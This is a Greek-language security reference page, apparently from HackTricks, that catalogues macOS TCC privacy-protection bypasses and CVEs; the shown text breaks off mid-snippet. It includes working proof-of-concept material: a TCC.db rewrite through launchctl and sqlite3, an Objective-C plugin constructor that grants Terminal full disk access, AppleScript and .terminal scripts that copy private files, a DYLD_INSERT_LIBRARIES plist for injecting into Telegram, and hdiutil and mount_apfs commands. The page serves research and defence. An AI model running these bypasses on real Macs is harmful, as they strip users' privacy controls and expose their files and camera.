# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Με βάση τη λειτουργικότητα

### Παράκαμψη Γραφής

Αυτό δεν είναι μια παράκαμψη, είναι απλώς πώς λειτουργεί το TCC: **Δεν προστατεύει από τη γραφή**. Αν το Terminal **δεν έχει πρόσβαση για να διαβάσει την Επιφάνεια Εργασίας ενός χρήστη, μπορεί ακόμα να γράψει σε αυτήν**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Το **εκτεταμένο χαρακτηριστικό `com.apple.macl`** προστίθεται στο νέο **αρχείο** για να δώσει στην **εφαρμογή των δημιουργών** πρόσβαση για να το διαβάσει.

### TCC ClickJacking

Είναι δυνατόν να **τοποθετήσετε ένα παράθυρο πάνω από την προτροπή TCC** ώστε ο χρήστης να **αποδεχτεί** χωρίς να το παρατηρήσει. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ο επιτιθέμενος μπορεί να **δημιουργήσει εφαρμογές με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να ζητήσει πρόσβαση σε κάποια προστατευμένη τοποθεσία TCC. Ο χρήστης θα νομίζει ότι η νόμιμη εφαρμογή είναι αυτή που ζητά αυτή την πρόσβαση.\
Επιπλέον, είναι δυνατόν να **αφαιρεθεί η νόμιμη εφαρμογή από το Dock και να τοποθετηθεί η ψεύτικη**, έτσι όταν ο χρήστης κάνει κλικ στην ψεύτικη (η οποία μπορεί να χρησιμοποιεί το ίδιο εικονίδιο) μπορεί να καλέσει την νόμιμη, να ζητήσει άδειες TCC και να εκτελέσει κακόβουλο λογισμικό, κάνοντάς τον χρήστη να πιστεύει ότι η νόμιμη εφαρμογή ζήτησε την πρόσβαση.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC στο:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Πλήρη Πρόσβαση Δίσκου"**. Για να το απενεργοποιήσετε, πρέπει να είναι καταχωρημένο αλλά απενεργοποιημένο (η αφαίρεση από τη λίστα δεν θα αφαιρέσει αυτά τα προνόμια):

![](<../../../../../images/image (1077).png>)

Εδώ μπορείτε να βρείτε παραδείγματα για το πώς κάποια **κακόβουλα λογισμικά έχουν καταφέρει να παρακάμψουν αυτή την προστασία**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Σημειώστε ότι τώρα, για να μπορέσετε να ενεργοποιήσετε το SSH χρειάζεστε **Πλήρη Πρόσβαση Δίσκου**

### Handle extensions - CVE-2022-26767

Το χαρακτηριστικό **`com.apple.macl`** δίνεται σε αρχεία για να δώσει σε μια **ορισμένη εφαρμογή άδειες να το διαβάσει.** Αυτό το χαρακτηριστικό ορίζεται όταν **σύρετε και αποθέτετε** ένα αρχείο πάνω από μια εφαρμογή, ή όταν ένας χρήστης **διπλοκλικάρει** ένα αρχείο για να το ανοίξει με την **προεπιλεγμένη εφαρμογή**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρήσει μια κακόβουλη εφαρμογή** για να χειρίζεται όλες τις επεκτάσεις και να καλέσει τις Υπηρεσίες Εκκίνησης για να **ανοίξει** οποιοδήποτε αρχείο (έτσι το κακόβουλο αρχείο θα αποκτήσει πρόσβαση για να το διαβάσει).

### iCloud

Η άδεια **`com.apple.private.icloud-account-access`** επιτρέπει την επικοινωνία με την **`com.apple.iCloudHelper`** υπηρεσία XPC που θα **παρέχει tokens iCloud**.

**iMovie** και **Garageband** είχαν αυτή την άδεια και άλλες που το επέτρεπαν.

Για περισσότερες **πληροφορίες** σχετικά με την εκμετάλλευση για **να αποκτήσετε tokens icloud** από αυτή την άδεια, ελέγξτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Μια εφαρμογή με την **άδεια `kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλες εφαρμογές**. Αυτό σημαίνει ότι θα μπορούσε να **καταχραστεί τις άδειες που έχουν παραχωρηθεί σε άλλες εφαρμογές**.

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, ελέγξτε:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Για παράδειγμα, αν μια εφαρμογή έχει **άδεια Αυτοματοποίησης πάνω στο `iTerm`**, για παράδειγμα σε αυτό το παράδειγμα **`Terminal`** έχει πρόσβαση πάνω στο iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Το Terminal, που δεν έχει FDA, μπορεί να καλέσει το iTerm, το οποίο το έχει, και να το χρησιμοποιήσει για να εκτελέσει ενέργειες:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Over Finder

Ή αν μια εφαρμογή έχει πρόσβαση μέσω του Finder, θα μπορούσε να είναι ένα σενάριο όπως αυτό:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## By App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Ο χρήστης **tccd daemon** χρησιμοποιούσε τη μεταβλητή **`HOME`** **env** για να έχει πρόσβαση στη βάση δεδομένων χρηστών TCC από: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτή την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή ο daemon TCC εκτελείται μέσω του `launchd` εντός του τομέα του τρέχοντος χρήστη, είναι δυνατό να **ελέγξει όλες τις μεταβλητές περιβάλλοντος** που του περνιούνται.\
Έτσι, ένας **επιτιθέμενος θα μπορούσε να ρυθμίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`** ώστε να δείχνει σε έναν **ελεγχόμενο** **φάκελο**, **να επανεκκινήσει** τον **daemon TCC** και στη συνέχεια **να τροποποιήσει άμεσα τη βάση δεδομένων TCC** για να δώσει στον εαυτό του **κάθε δικαίωμα TCC διαθέσιμο** χωρίς ποτέ να ζητήσει από τον τελικό χρήστη.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Σημειώσεις

Οι Σημειώσεις είχαν πρόσβαση σε προστατευμένες τοποθεσίες TCC, αλλά όταν δημιουργείται μια σημείωση, αυτή **δημιουργείται σε μια μη προστατευμένη τοποθεσία**. Έτσι, θα μπορούσατε να ζητήσετε από τις σημειώσεις να αντιγράψουν ένα προστατευμένο αρχείο σε μια σημείωση (έτσι σε μια μη προστατευμένη τοποθεσία) και στη συνέχεια να αποκτήσετε πρόσβαση στο αρχείο:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Μετατόπιση

Ο δυαδικός κώδικας `/usr/libexec/lsd` με τη βιβλιοθήκη `libsecurity_translocate` είχε την εξουσία `com.apple.private.nullfs_allow`, η οποία του επέτρεπε να δημιουργήσει **nullfs** mount και είχε την εξουσία `com.apple.private.tcc.allow` με **`kTCCServiceSystemPolicyAllFiles`** για να αποκτά πρόσβαση σε κάθε αρχείο.

Ήταν δυνατό να προστεθεί το χαρακτηριστικό καραντίνας στη "Βιβλιοθήκη", να καλέσετε την υπηρεσία XPC **`com.apple.security.translocation`** και στη συνέχεια θα χαρτογραφούσε τη Βιβλιοθήκη σε **`$TMPDIR/AppTranslocation/d/d/Library`** όπου όλα τα έγγραφα μέσα στη Βιβλιοθήκη θα μπορούσαν να είναι **προσβάσιμα**.

### CVE-2023-38571 - Μουσική & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** έχει μια ενδιαφέρουσα δυνατότητα: Όταν εκτελείται, θα **εισάγει** τα αρχεία που ρίχνονται στο **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** στη "βιβλιοθήκη μέσων" του χρήστη. Επιπλέον, καλεί κάτι σαν: **`rename(a, b);`** όπου `a` και `b` είναι:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Αυτή η συμπεριφορά **`rename(a, b);`** είναι ευάλωτη σε **Race Condition**, καθώς είναι δυνατό να τοποθετηθεί μέσα στον φάκελο `Automatically Add to Music.localized` ένα ψεύτικο αρχείο **TCC.db** και στη συνέχεια, όταν δημιουργηθεί ο νέος φάκελος (b) για να αντιγραφεί το αρχείο, να διαγραφεί και να δείξει σε **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Αν **`SQLITE_SQLLOG_DIR="path/folder"`** σημαίνει βασικά ότι **κάθε ανοιχτή βάση δεδομένων αντιγράφεται σε αυτήν την διαδρομή**. Σε αυτήν την CVE, αυτή η ρύθμιση ελέγχου καταχράστηκε για να **γράψει** μέσα σε μια **βάση δεδομένων SQLite** που πρόκειται να **ανοιχτεί από μια διαδικασία με FDA τη βάση δεδομένων TCC**, και στη συνέχεια να καταχραστεί **`SQLITE_SQLLOG_DIR`** με ένα **symlink στο όνομα αρχείου** έτσι ώστε όταν αυτή η βάση δεδομένων είναι **ανοιχτή**, ο χρήστης **TCC.db να αντικαθίσταται** με την ανοιχτή.

**Περισσότερες πληροφορίες** [**στην αναφορά**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **και** [**στην ομιλία**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Αν η μεταβλητή περιβάλλοντος **`SQLITE_AUTO_TRACE`** είναι ρυθμισμένη, η βιβλιοθήκη **`libsqlite3.dylib`** θα αρχίσει να **καταγράφει** όλα τα SQL ερωτήματα. Πολλές εφαρμογές χρησιμοποίησαν αυτή τη βιβλιοθήκη, οπότε ήταν δυνατό να καταγραφούν όλα τα SQLite ερωτήματα τους.

Πολλές εφαρμογές της Apple χρησιμοποίησαν αυτή τη βιβλιοθήκη για να αποκτήσουν πρόσβαση σε προστατευμένες πληροφορίες TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Αυτή η **μεταβλητή περιβάλλοντος χρησιμοποιείται από το `Metal` framework** το οποίο είναι εξάρτηση για διάφορα προγράμματα, κυρίως το `Music`, το οποίο έχει FDA.

Ρυθμίζοντας το εξής: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Αν το `path` είναι έγκυρος φάκελος, το σφάλμα θα ενεργοποιηθεί και μπορούμε να χρησιμοποιήσουμε το `fs_usage` για να δούμε τι συμβαίνει στο πρόγραμμα:

- ένα αρχείο θα `open()`εται, που ονομάζεται `path/.dat.nosyncXXXX.XXXXXX` (X είναι τυχαίος)
- ένα ή περισσότερα `write()` θα γράψουν τα περιεχόμενα στο αρχείο (δεν το ελέγχουμε αυτό)
- το `path/.dat.nosyncXXXX.XXXXXX` θα `renamed()` σε `path/name`

Είναι μια προσωρινή εγγραφή αρχείου, ακολουθούμενη από μια **`rename(old, new)`** **η οποία δεν είναι ασφαλής.**

Δεν είναι ασφαλής γιατί πρέπει να **λύσει τους παλιούς και νέους φακέλους ξεχωριστά**, κάτι που μπορεί να πάρει κάποιο χρόνο και μπορεί να είναι ευάλωτο σε Race Condition. Για περισσότερες πληροφορίες μπορείτε να ελέγξετε τη λειτουργία `renameat_internal()` του `xnu`.

> [!CAUTION]
> Ουσιαστικά, αν μια προνομιακή διαδικασία μετονομάζει από έναν φάκελο που ελέγχετε, θα μπορούσατε να κερδίσετε ένα RCE και να την κάνετε να έχει πρόσβαση σε ένα διαφορετικό αρχείο ή, όπως σε αυτήν την CVE, να ανοίξετε το αρχείο που δημιούργησε η προνομιακή εφαρμογή και να αποθηκεύσετε ένα FD.
>
> Αν η μετονομασία έχει πρόσβαση σε έναν φάκελο που ελέγχετε, ενώ έχετε τροποποιήσει το αρχικό αρχείο ή έχετε ένα FD σε αυτό, αλλάζετε το αρχείο (ή φάκελο) προορισμού ώστε να δείχνει σε ένα symlink, έτσι ώστε να μπορείτε να γράφετε όποτε θέλετε.

Αυτή ήταν η επίθεση στην CVE: Για παράδειγμα, για να αντικαταστήσουμε τη βάση δεδομένων `TCC.db` του χρήστη, μπορούμε:

- να δημιουργήσουμε `/Users/hacker/ourlink` για να δείχνει στο `/Users/hacker/Library/Application Support/com.apple.TCC/`
- να δημιουργήσουμε το φάκελο `/Users/hacker/tmp/`
- να ρυθμίσουμε `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- να ενεργοποιήσουμε το σφάλμα εκτελώντας το `Music` με αυτή τη μεταβλητή περιβάλλοντος
- να πιάσουμε το `open()` του `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X είναι τυχαίος)
- εδώ επίσης `open()` αυτό το αρχείο για εγγραφή, και να κρατήσουμε τον περιγραφέα αρχείου
- να αλλάξουμε ατομικά το `/Users/hacker/tmp` με το `/Users/hacker/ourlink` **σε βρόχο**
- το κάνουμε αυτό για να μεγιστοποιήσουμε τις πιθανότητες επιτυχίας μας καθώς το παράθυρο αγώνα είναι αρκετά στενό, αλλά η απώλεια του αγώνα έχει αμελητέα αρνητική πλευρά
- περιμένουμε λίγο
- δοκιμάζουμε αν είχαμε τύχη
- αν όχι, τρέχουμε ξανά από την αρχή

Περισσότερες πληροφορίες στο [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Τώρα, αν προσπαθήσετε να χρησιμοποιήσετε τη μεταβλητή περιβάλλοντος `MTL_DUMP_PIPELINES_TO_JSON_FILE`, οι εφαρμογές δεν θα εκκινηθούν

### Apple Remote Desktop

Ως root μπορείτε να ενεργοποιήσετε αυτή την υπηρεσία και ο **ARD agent θα έχει πλήρη πρόσβαση στο δίσκο** που θα μπορούσε στη συνέχεια να καταχραστεί από έναν χρήστη για να τον κάνει να αντιγράψει μια νέα **βάση δεδομένων TCC χρήστη**.

## Με **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια βάση δεδομένων στον φάκελο HOME του χρήστη για να ελέγξει την πρόσβαση σε πόρους συγκεκριμένους για τον χρήστη στο **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο χρήστης καταφέρει να επανεκκινήσει το TCC με μια μεταβλητή περιβάλλοντος $HOME που δείχνει σε **διαφορετικό φάκελο**, ο χρήστης θα μπορούσε να δημιουργήσει μια νέα βάση δεδομένων TCC στο **/Library/Application Support/com.apple.TCC/TCC.db** και να ξεγελάσει το TCC να παραχωρήσει οποιαδήποτε άδεια TCC σε οποιαδήποτε εφαρμογή.

> [!TIP]
> Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που αποθηκεύεται μέσα στο προφίλ του χρήστη στο **`NFSHomeDirectory`** χαρακτηριστικό για την **τιμή του `$HOME`**, οπότε αν παραβιάσετε μια εφαρμογή με άδειες να τροποποιήσει αυτή την τιμή (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **οπλοποιήσετε** αυτή την επιλογή με μια παράκαμψη TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Η **πρώτη POC** χρησιμοποιεί [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για να τροποποιήσει το **HOME** φάκελο του χρήστη.

1. Λάβετε ένα _csreq_ blob για την στοχοθετημένη εφαρμογή.
2. Φυτέψτε ένα ψεύτικο _TCC.db_ αρχείο με απαιτούμενη πρόσβαση και το _csreq_ blob.
3. Εξάγετε την εγγραφή Υπηρεσιών Καταλόγου του χρήστη με [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε την εγγραφή Υπηρεσιών Καταλόγου για να αλλάξετε το φάκελο του χρήστη.
5. Εισάγετε την τροποποιημένη εγγραφή Υπηρεσιών Καταλόγου με [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Σταματήστε το _tccd_ του χρήστη και επανεκκινήστε τη διαδικασία.

Η δεύτερη POC χρησιμοποίησε **`/usr/libexec/configd`** που είχε `com.apple.private.tcc.allow` με την τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατό να εκτελέσετε το **`configd`** με την επιλογή **`-t`**, ένας επιτιθέμενος θα μπορούσε να καθορίσει ένα **προσαρμοσμένο Bundle για φόρτωση**. Επομένως, η εκμετάλλευση **αντικαθιστά** τη μέθοδο **`dsexport`** και **`dsimport`** για την αλλαγή του φακέλου του χρήστη με μια **ένεση κώδικα configd**.

Για περισσότερες πληροφορίες ελέγξτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Με ένεση διαδικασίας

Υπάρχουν διάφορες τεχνικές για να εγχύσετε κώδικα μέσα σε μια διαδικασία και να καταχραστείτε τα προνόμια TCC της:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Επιπλέον, η πιο κοινή ένεση διαδικασίας για να παρακάμψετε το TCC που βρέθηκε είναι μέσω **plugins (load library)**.\
Τα plugins είναι επιπλέον κώδικας συνήθως με τη μορφή βιβλιοθηκών ή plist, που θα **φορτωθούν από την κύρια εφαρμογή** και θα εκτελούνται υπό το πλαίσιο της. Επομένως, αν η κύρια εφαρμογή είχε πρόσβαση σε αρχεία περιορισμένα από το TCC (μέσω παραχωρημένων αδειών ή δικαιωμάτων), ο **προσαρμοσμένος κώδικας θα έχει επίσης πρόσβαση**.

### CVE-2020-27937 - Directory Utility

Η εφαρμογή `/System/Library/CoreServices/Applications/Directory Utility.app` είχε την άδεια **`kTCCServiceSystemPolicySysAdminFiles`**, φόρτωσε plugins με επέκταση **`.daplug`** και **δεν είχε την σκληρυμένη** εκτέλεση.

Για να οπλοποιήσετε αυτή την CVE, το **`NFSHomeDirectory`** **αλλάζει** (καταχρώντας την προηγούμενη άδεια) προκειμένου να μπορέσετε να **αναλάβετε τη βάση δεδομένων TCC των χρηστών** για να παρακάμψετε το TCC.

Για περισσότερες πληροφορίες ελέγξτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Το δυαδικό **`/usr/sbin/coreaudiod`** είχε τις άδειες `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Η πρώτη **επιτρέπει την ένεση κώδικα** και η δεύτερη δίνει πρόσβαση για **διαχείριση του TCC**.

Αυτό το δυαδικό επέτρεπε τη φόρτωση **τρίτων plugins** από το φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατό να **φορτώσετε ένα plugin και να καταχραστείτε τις άδειες TCC** με αυτό το PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Για περισσότερες πληροφορίες, ελέγξτε την [**πρωτότυπη αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Οι εφαρμογές συστήματος που ανοίγουν ροή κάμερας μέσω Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν **κατά τη διαδικασία αυτά τα πρόσθετα** που βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (όχι περιορισμένα από SIP).

Απλά αποθηκεύοντας εκεί μια βιβλιοθήκη με τον κοινό **κατασκευαστή** θα λειτουργήσει για **εισαγωγή κώδικα**.

Πολλές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox είχε τα δικαιώματα `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε εύκολα αυτό [**ελέγξτε την αρχική αναφορά**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Το δυαδικό αρχείο `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τα δικαιώματα **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, που επέτρεπαν την εισαγωγή κώδικα μέσα στη διαδικασία και τη χρήση των δικαιωμάτων TCC.

### CVE-2023-26818 - Telegram

Το Telegram είχε τα δικαιώματα **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, οπότε ήταν δυνατό να το εκμεταλλευτεί κανείς για **να αποκτήσει πρόσβαση στα δικαιώματά του** όπως η καταγραφή με την κάμερα. Μπορείτε να [**βρείτε το payload στην αναφορά**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Σημειώστε πώς να χρησιμοποιήσετε τη μεταβλητή env για να φορτώσετε μια βιβλιοθήκη, δημιουργήθηκε μια **προσαρμοσμένη plist** για να εισαχθεί αυτή η βιβλιοθήκη και χρησιμοποιήθηκε το **`launchctl`** για να την εκκινήσει:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Με ανοιχτές κλήσεις

Είναι δυνατόν να καλέσετε **`open`** ακόμη και ενώ είστε σε sandbox

### Σενάρια Τερματικού

Είναι αρκετά συνηθισμένο να δίνετε στο τερματικό **Πλήρη Πρόσβαση Δίσκου (FDA)**, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από τεχνικούς. Και είναι δυνατόν να καλέσετε σενάρια **`.terminal`** χρησιμοποιώντας το.

**`.terminal`** σενάρια είναι αρχεία plist όπως αυτό με την εντολή που θα εκτελεστεί στο κλειδί **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Μια εφαρμογή θα μπορούσε να γράψει ένα σενάριο τερματικού σε μια τοποθεσία όπως το /tmp και να το εκκινήσει με μια εντολή όπως:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Με την τοποθέτηση

### CVE-2020-9771 - παράκαμψη TCC mount_apfs και κλιμάκωση προνομίων

**Οποιοσδήποτε χρήστης** (ακόμα και μη προνομιούχοι) μπορεί να δημιουργήσει και να τοποθετήσει μια στιγμιότυπο του Time Machine και **να έχει πρόσβαση σε ΟΛΑ τα αρχεία** αυτού του στιγμιότυπου.\
Η **μόνη προνομιακή** πρόσβαση που απαιτείται είναι για την εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`) η οποία πρέπει να παραχωρηθεί από έναν διαχειριστή.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερής εξήγηση μπορεί να [**βρεθεί στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Ακόμα και αν το αρχείο DB του TCC είναι προστατευμένο, ήταν δυνατό να **mount over the directory** ένα νέο αρχείο TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
